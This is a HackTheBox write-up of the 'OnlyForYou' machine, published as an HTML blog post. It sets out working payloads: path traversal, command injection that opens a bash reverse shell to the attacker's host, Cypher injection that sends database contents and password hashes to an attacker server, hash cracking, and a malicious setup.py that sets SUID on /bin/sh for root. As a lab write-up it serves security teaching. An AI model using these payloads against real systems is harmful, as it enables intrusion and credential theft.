@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content="" />
+        <meta name="author" content="" />
+        <title>HackTheBox - OnlyForYou 💖 (Medium)</title>
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Font Awesome icons (free version)-->
+        <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+        <!-- Google fonts-->
+        <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css" />
+        <link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/prism.min.js">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/9000.0.1/themes/prism-coy.min.css">
+        <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>
+
+
+    </head>
+
+    <style>
+        pre {
+            font-size: 13px;
+        }
+    </style>
+    
+    <body style="font-size: 17px;">
+        <!-- Navigation-->
+        <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+            <div class="container px-4 px-lg-5">
+                <a class="navbar-brand" href="index.html">Yazid's notes</a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                    Menu
+                    <i class="fas fa-bars"></i>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarResponsive">
+                    <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="index.html">Home</a></li>
+                        <!--<li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="about.html">About</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="post.html">Sample Post</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="contact.html">Contact</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </nav>
+        <!-- Page Header-->
+        <header class="masthead" style="background-image: url('assets/img/only4you_hearts.png')">
+            <div class="container position-relative px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <div class="post-heading">
+                            <h1>HackTheBox - OnlyForYou 💖 (Medium)</h1>
+                            <h2 class="subheading">HackTheBox Write-Up on OnlyForYou Machine</h2>
+                            <span class="meta">
+                                Posted by
+                                <a href="#!">Yazid</a>
+                                on May 31, 2023
+                            </span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <!-- Post Content-->
+        <article class="mb-4">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                      
+                        <div style="display: flex; justify-content: center; align-items: center;">
+                            <img width="100%" src="assets/img/OnlyForYou.png">
+                        </div>
+
+                        <p> The machine is hosted on 10.10.11.210, let's take the first steps : </p>
+                        <pre>
+                            <code>
+nmap --min-rate=1000 -T4 10.10.11.210
+
+echo "10.10.11.210 only4you.htb" >> /etc/hosts
+
+                            </code>
+                        </pre>
+
+                        <div style="display: flex; justify-content: center; align-items: center;">
+                            <img width="100%" src="https://i.ibb.co/8B2n105/image.png">
+                        </div>
+                        
+
+                        <p> The scan revealed ports 80 and 22 among the details. For the moment, the page and its source code gave nothing revealing, so i started enumerating the web host directories but got no results, so I enumerated the subdomains using SecLists wordlists </p>
+                        <pre>
+                            <code>
+wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.only4you.htb" http://only4you.htb | grep 200
+                            </code>
+                        </pre>
+                        <p>
+                            Then i found an existing "beta" subdomain returning HTTP status 200, interesting, let's add it.
+                        </p>
+                        <pre>
+                            <code>
+sudo nano /etc/hosts
+
+10.10.11.210 only4you.htb beta.only4you.htb
+                            </code>
+                        </pre>
+
+                        <div style="display: flex; justify-content: center; align-items: center;">
+                            <img width="100%" src="https://i.ibb.co/DfLHGXz/image.png">
+                        </div>
+                        
+                        <p>
+                            Got a web page giving the "beta" source code of the tool they supposed to sell, and two options at the corner. I downloaded the source code & i followed "resize", then i gived as an entry a png picture. 
+                         </p>
+
+                         <div style="display: flex; justify-content: center; align-items: center;">
+                            <img width="100%" src="https://i.ibb.co/smj3p9x/image.png">
+                        </div>
+
+                        <p>
+                            In the source code of the resizing application, one detail caught my eye in the <code>@app.route('/download')</code> block, the method checks that the file name doesn't contain any ".." and doesn't start with "../", it smells of local file inclusion.
+                        </p>
+
+                        <pre class="prettyprint lang-python">
+                            <code>
+@app.route('/download', methods=['POST'])
+def download():
+    image = request.form['image']
+    filename = posixpath.normpath(image) 
+    if '..' in filename or filename.startswith('../'):
+        flash('Hacking detected!', 'danger')
+        return redirect('/list')
+    if not os.path.isabs(filename):
+        filename = os.path.join(app.config['LIST_FOLDER'], filename)
+    try:
+        if not os.path.isfile(filename):
+            flash('Image doesn\'t exist!', 'danger')
+            return redirect('/list')
+    except (TypeError, ValueError):
+        raise BadRequest()
+    return send_file(filename, as_attachment=True)
+                            </code>
+                        </pre>
+
+                        <p>
+                            Let's give it a try, we intercept the HTTP request to /download, and we obfuscate the payload "/../../../../etc/passwd" with an URL encoding.
+                        </p>
+
+                        <pre style="font-size: 12px;">
+POST /download HTTP/1.1
+Host: beta.only4you.htb
+Content-Length: 45
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://beta.only4you.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://beta.only4you.htb/list
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiSGFja2luZyBkZXRlY3RlZCEiXX1dfQ.ZHY8_g.J_xsGK7w8CbHCpYUsHUoREwVCWA
+Connection: close
+
+image=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+                        </pre>
+
+                        <p> Bingo ! Got passwd ! </p>
+                    
+<pre style="font-size: 12px;">
+
+    HTTP/1.1 200 OK
+    Server: nginx/1.18.0 (Ubuntu)
+    Date: Tue, 30 May 2023 18:29:46 GMT
+    Content-Type: application/octet-stream
+    Content-Length: 2079
+    Connection: close
+    Content-Disposition: attachment; filename=passwd
+    Last-Modified: Thu, 30 Mar 2023 12:12:20 GMT
+    Cache-Control: no-cache
+    ETag: "1680178340.2049809-2079-393413677"
+    
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    sys:x:3:3:sys:/dev:/usr/sbin/nologin
+    sync:x:4:65534:sync:/bin:/bin/sync
+    games:x:5:60:games:/usr/games:/usr/sbin/nologin
+    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+    landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+    pollinate:x:110:1::/var/cache/pollinate:/bin/false
+    usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+    sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+    john:x:1000:1000:john:/home/john:/bin/bash
+    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+    mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+    neo4j:x:997:997::/var/lib/neo4j:/bin/bash
+    dev:x:1001:1001::/home/dev:/bin/bash
+    fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+    _laurel:x:996:996::/var/log/laurel:/bin/false
+
+</pre>
+
+<p>
+    One of the users is named john. <br> Let's now try to retrieve the app.py file through the same method.
+</p>
+
+<p> Response for the following payload : </p>
+<pre >
+image=/%2e%2e/%2e%2e/%2e%2e/%2e%2e/var/www/only4you/app.py
+    
+</pre>
+<pre style="font-size: 12px;" class="prettyprint lang-python">
+    import smtplib, re
+from email.message import EmailMessage
+from subprocess import PIPE, run
+import ipaddress
+
+def issecure(email, ip):
+	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
+		return 0
+	else:
+		domain = email.split("@", 1)[1]
+		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+		output = result.stdout.decode('utf-8')
+		if "v=spf1" not in output:
+			return 1
+		else:
+			domains = []
+			ips = []
+			if "include:" in output:
+				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
+				dms.pop(0)
+				for domain in dms:
+					domains.append(domain)
+				while True:
+					for domain in domains:
+						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+						output = result.stdout.decode('utf-8')
+						if "include:" in output:
+							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
+							domains.clear()
+							for domain in dms:
+								domains.append(domain)
+						elif "ip4:" in output:
+							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
+							ipaddresses.pop(0)
+							for i in ipaddresses:
+								ips.append(i)
+						else:
+							pass
+					break
+			elif "ip4" in output:
+				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
+				ipaddresses.pop(0)
+				for i in ipaddresses:
+					ips.append(i)
+			else:
+				return 1
+		for i in ips:
+			if ip == i:
+				return 2
+			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
+				return 2
+			else:
+				return 1
+
+def sendmessage(email, subject, message, ip):
+	status = issecure(email, ip)
+	if status == 2:
+		msg = EmailMessage()
+		msg['From'] = f'{email}'
+		msg['To'] = 'info@only4you.htb'
+		msg['Subject'] = f'{subject}'
+		msg['Message'] = f'{message}'
+
+		smtp = smtplib.SMTP(host='localhost', port=25)
+		smtp.send_message(msg)
+		smtp.quit()
+		return status
+	elif status == 1:
+		return status
+	else:
+		return status
+</pre>
+
+<br>Interseting thing right there :  <br><br>   
+
+<pre class="prettyprint">
+    result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+</pre>
+
+<p>
+    The content of the mail field is retrieved from the contact fields on the home page.
+    The program performs a hard DNS lookup on the domain name to make sure it exists. The only condition for moving on to the next block is that the entry follows a fairly generous regular expression. 
+In other words, everything after the "@" is executed. 
+</p>
+
+<p>
+    I'd love rush and try an RCE, but first let's make sure that the requests are actually executed by the machine. <br>Let's try sending a ping echo to our machine and see if we can receive it.
+</p>
+
+<p>
+    URL-format-obfuscated entry for <code>ping 10.10.16.54 -c 1</code>
+</p>
+<pre>
+    <code>
+    name=Yazid&email=yazid%40gmail.com;ping%2010.10.16.54%20%2d%63%201&subject=Hello&message=On+the+rockzzz
+    </code>
+</pre>
+
+<pre>
+    <code>
+        (base) ┌─[yazid@parrot]─[~/Desktop]
+└──╼ $sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+01:02:18.457469 IP only4you.htb > 10.10.16.54: ICMP echo request, id 2, seq 1, length 64
+01:02:18.457506 IP 10.10.16.54 > only4you.htb: ICMP echo reply, id 2, seq 1, length 64
+    </code>
+</pre>
+
+<p>We're getting the echoes, time for the reverse shell ! payload : <code>bash -c "bash -i >& /dev/tcp/10.10.16.54/2106 0>&1"</code>  </p>
+
+<pre>
+    name=Yazid&email=yazid%40gmail.com;%0d%0abash%20-c%20%22bash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.10.16.54%2f2106%200%3e%261%22;message=On+the+rockzzz
+</pre>
+
+
+<pre>
+    <code>
+listening on [any] 2106 ...
+connect to [10.10.16.54] from (UNKNOWN) [10.10.11.210] 48540
+bash: cannot set terminal process group (1016): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@only4you:~/only4you.htb$ id 
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    </code>
+</pre>
+
+<p> Reverse shell established. <br>After digging into the machine, its status networks are as follows </p>
+
+<pre>
+    <code>
+www-data@only4you:/$ netstat -an
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 10.10.11.210:51182      10.10.14.102:9998       ESTABLISHED
+tcp        0      0 127.0.0.1:38006         127.0.0.1:7687          ESTABLISHED
+tcp        0     12 10.10.11.210:35280      10.10.16.54:2106        ESTABLISHED
+tcp        0      0 10.10.11.210:35708      10.10.14.128:7979       ESTABLISHED
+tcp        0      0 127.0.0.1:56624         127.0.0.1:7687          ESTABLISHED
+tcp        0      1 10.10.11.210:53794      8.8.8.8:53              SYN_SENT   
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN     
+tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN     
+tcp6       0      0 127.0.0.1:7687          127.0.0.1:38006         ESTABLISHED
+tcp6       0      0 127.0.0.1:7687          127.0.0.1:56624         ESTABLISHED
+udp        0      0 127.0.0.1:39391         127.0.0.53:53           ESTABLISHED
+udp        0      0 127.0.0.53:53           0.0.0.0:*                          
+udp        0      0 0.0.0.0:68              0.0.0.0:*   
+    </code>
+</pre>
+
+<p>We then establish a tunnel with <a href="https://github.com/jpillora/chisel"><b>chisel</b></a> to access possible web portals for these services. On client side :</p>
+
+<pre>
+    <code>
+www-data@only4you:~/only4you.htb$ ./chisel_1.8.1_linux_amd64 client 10.10.16.54:8888 R:8889:localhost:3000
+    </code>
+</pre>
+
+<p> On server side </p>
+    
+<pre>
+    <code>
+└──╼ $./chisel_1.8.1_linux_amd64 server --p 8888 -reverse
+2023/05/31 02:56:17 server: Reverse tunnelling enabled
+2023/05/31 02:56:17 server: Fingerprint 8q5FP2W94F4I0cPqIsC7HR2s18ZhHyc666xnnadZoFA=
+2023/05/31 02:56:17 server: Listening on http://0.0.0.0:8888
+2023/05/31 02:58:31 server: session#1: tun: proxy#R:8889=>localhost:3000: Listening
+    </code>
+</pre>
+
+<p> We establish tunnelisation for all the services and make them run on background </p>
+
+<pre>
+    <code>
+www-data@only4you:~/only4you.htb$ ./chisel_1.8.1_linux_amd64 client 10.10.16.54:8888 R:8889:localhost:3000 &
+[1] 61310
+www-data@only4you:~/only4you.htb$ ./chisel_1.8.1_linux_amd64 client 10.10.16.54:8888 R:8890:localhost:8001 &  
+[2] 61319
+www-data@only4you:~/only4you.htb$ ./chisel_1.8.1_linux_amd64 client 10.10.16.54:8888 R:8891:localhost:33060 &
+[3] 61334
+www-data@only4you:~/only4you.htb$ ./chisel_1.8.1_linux_amd64 client 10.10.16.54:8888 R:8892:localhost:3306 &
+[4] 61341
+www-data@only4you:~/only4you.htb$ ./chisel_1.8.1_linux_amd64 client 10.10.16.54:8888 R:8893:localhost:7687 &
+[5] 61356
+www-data@only4you:~/only4you.htb$ ./chisel_1.8.1_linux_amd64 client 10.10.16.54:8888 R:8894:localhost:7474 &
+[6] 61363
+    </code>
+</pre>
+
+<p>
+    Let's now try to access the web portal of these services :
+</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/onlyforyou-1.png">
+</div>
+
+<p>A simple classy <b>admin:admin</b> and we're in, it's a Neo4j interface, Neo4j is a known DBMS.</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/onlyforyou-2.png">
+</div>
+
+<br>
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/onlyforyou-3.png">
+</div>
+
+<br>
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/onlyforyou-4.png">
+</div>
+
+<p>
+Some versions of Neo4j are known to be vulnerable to data exfiltration via <b>SQL injection</b>.
+<br><br>
+The following links give more details on how to exploit the flaw : <br><br>
+
+<a href="https://exploit-notes.hdks.org/exploit/database/neo4j-pentesting/">https://exploit-notes.hdks.org/exploit/database/neo4j-pentesting/</a>
+<br><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j</a>
+</p>
+
+<p>
+    We craft the following payload and send it through the search bar, this payload aims to retrieve details about the DBMS :
+</p>
+
+<pre>
+    <code>
+yazid ' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.54:7777/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //    
+    </code>
+</pre>
+
+<pre>
+    <code>
+        └──╼ $sudo python -m http.server 7777
+Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
+10.10.11.210 - - [31/May/2023 16:34:35] "GET /chisel_1.8.1_linux_amd64 HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:38:35] code 400, message Bad request syntax ('GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1')
+10.10.11.210 - - [31/May/2023 16:38:35] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
+    </code>
+</pre>
+
+<p>
+    OK. Let's know craft a payload to retrieve table names :
+</p>
+
+<pre>
+    <code>
+yazid ' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.54:7777/?label='+label as l RETURN 0 as _0 //
+    </code>
+</pre>
+
+<pre>
+    <code>
+10.10.11.210 - - [31/May/2023 16:51:01] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:01] "GET /?label=employee HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:01] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:01] "GET /?label=employee HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:02] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:02] "GET /?label=employee HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:02] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:02] "GET /?label=employee HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:02] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:51:03] "GET /?label=employee HTTP/1.1" 200 -
+    </code>
+</pre>
+
+<p>
+    Table names retrieved, we want to see now their content : 
+</p>
+
+<pre>
+    <code>
+yazid ' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.54:7777/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+    </code>
+</pre>
+
+<pre>
+    <code>
+10.10.11.210 - - [31/May/2023 16:55:38] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:55:38] "GET /?username=admin HTTP/1.1" 200 - 
+10.10.11.210 - - [31/May/2023 16:55:38] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.10.11.210 - - [31/May/2023 16:55:38] "GET /?username=john HTTP/1.1" 200 -    </code>
+</pre>
+
+<p> Hold on ! We got the hashed password for john in the response : a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6. <br> Let's identify it and try to crack it. </p>
+
+<pre>
+    <code>
+        └──╼ $hash-identifier a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+
+Possible Hashs:
+[+] SHA-256
+[+] Haval-256
+
+Least Possible Hashs:
+[+] GOST R 34.11-94
+[+] RipeMD-256
+[+] SNEFRU-256
+[+] SHA-256(HMAC)
+[+] Haval-256(HMAC)
+[+] RipeMD-256(HMAC)
+[+] SNEFRU-256(HMAC)
+[+] SHA-256(md5($pass))
+[+] SHA-256(sha1($pass))
+    </code>
+</pre>
+
+<pre>
+    <code>
+        └──╼ $john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=8
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<b style="color: red;">ThisIs4You      </b> (?)
+1g 0:00:00:01 DONE (2023-05-31 17:10) 0.5555g/s 5898Kp/s 5898Kc/s 5898KC/s Xavier44..SaGiTaRiO13
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed
+    </code>
+</pre>
+
+<p> Password retrieved ! We can now establish an SSH connexion to john's account.</p>
+
+<pre>
+    <code>
+john@only4you:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john)
+john@only4you:~$ pwd
+/home/john
+john@only4you:~$ cat user.txt
+3bc32a100472e15ad9e837855a7f555e
+john@only4you:~$
+    </code>
+</pre>
+
+<p> Before using PrivEsc tools, let's see what <code>sudo -l</code> has to say :</p>
+
+<pre>
+<code>
+john@only4you:~$ sudo -l
+Matching Defaults entries for john on only4you:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on only4you:
+    <b>(root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz</b>
+</code>
+</pre>
+
+<p>
+    It is possible to execute arbitrary code when installing a package with pip. For more details, see the following links: <br><br>
+    <a href="https://medium.com/ochrona/arbitrary-code-execution-during-python-package-installation-3a60990350ef">https://medium.com/ochrona/arbitrary-code-execution-during-python-package-installation-3a60990350ef</a><br>
+    <a href="https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/">https://embracethered.com/blog/posts/2022/python-package-manager-install-and-download-vulnerability/</a>
+
+</p>
+
+
+<p>We use the following repository as a basis for our malicious package: <b><a href="https://github.com/wunderwuzzi23/this_is_fine_wuzzi/">https://github.com/wunderwuzzi23/this_is_fine_wuzzi/</a></b></p>
+
+<pre>
+    <code>
+git clone https://github.com/wunderwuzzi23/this_is_fine_wuzzigit 
+codium ./this_is_fine_wuzzi/
+    </code>
+</pre>
+    
+<p>We then modify the setup.py key file as follows :</p>
+<pre class="prettyprint">
+    <code>
+from setuptools import setup, find_packages
+from setuptools.command.install import install
+from setuptools.command.egg_info import egg_info
+import socket,os,pty
+
+
+def RunCommand():
+    print("On the rockzzzz")
+    os.system("chmod u+s /bin/sh")
+
+class RunEggInfoCommand(egg_info):
+    def run(self):
+        RunCommand()
+        egg_info.run(self)
+
+
+class RunInstallCommand(install):
+    def run(self):
+        RunCommand()
+        install.run(self)
+
+setup(
+    name = "this_is_fine_wuzzi",
+    version = "0.0.1",
+    license = "MIT",
+    packages=find_packages(),
+    cmdclass={
+        'install' : RunInstallCommand,
+        'egg_info': RunEggInfoCommand
+    },
+)
+    </code>
+</pre>
+
+<p> This is an attempt to elevate privileges using the <a href="https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/">sticky bit method</a>.  </p>
+
+<p>We then build the package :</p>
+<pre>
+   <code>
+    (base) ┌─[✗]─[yazid@parrot]─[~/this_is_fine_wuzzi]
+└──╼ $python -m build
+* Creating venv isolated environment...
+* Installing packages in isolated environment... (setuptools >= 40.8.0, wheel)
+* Getting build dependencies for sdist...
+running egg_info
+On the rockzzzz
+   </code> 
+    </pre>
+<p>And upload it to the organization's git via Gogs (port 3000)</p>
+
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/onlyforyou-5.png">
+</div>
+<br>
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/onlyforyou-6.png">
+</div>
+<br>
+<div style="display: flex; justify-content: center; align-items: center;">
+    <img width="100%" src="assets/img/onlyforyou-7.png">
+</div>
+
+<p>Which we then fetch via our command executed with sudo :</p>
+<pre>
+    <code>
+john@only4you:~$ sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/this_is_fine_wuzzi-0.0.1.tar.gz
+    </code>
+</pre>
+
+<p>And we're bringing it all to a beautiful close : </p>
+
+<pre>
+john@only4you:~$ bash -p
+bash-5.0# id
+uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)
+bash-5.0# cat /root/root.txt
+92569bebfd612b8b26582e06062f9444
+</pre>
+
+                    </div>
+                </div>
+            </div>
+        </article>
+        <!-- Footer-->
+        <footer class="border-top">
+            <div class="container px-4 px-lg-5">
+                <div class="row gx-4 gx-lg-5 justify-content-center">
+                    <div class="col-md-10 col-lg-8 col-xl-7">
+                        <ul class="list-inline text-center">
+                            <!--<li class="list-inline-item">
+                                <a href="#!">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                            <li class="list-inline-item">
+                                <a href="#!">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>-->
+                            <li class="list-inline-item">
+                                <a href="http://github.com/xacone">
+                                    <span class="fa-stack fa-lg">
+                                        <i class="fas fa-circle fa-stack-2x"></i>
+                                        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                    </span>
+                                </a>
+                            </li>
+                        </ul>
+                        <div class="small text-center text-muted fst-italic">Copyright &copy; Yazid 2023</div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- Bootstrap core JS-->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+        <!-- Core theme JS-->
+        <script src="js/scripts.js"></script>
+    </body>
+    <script>
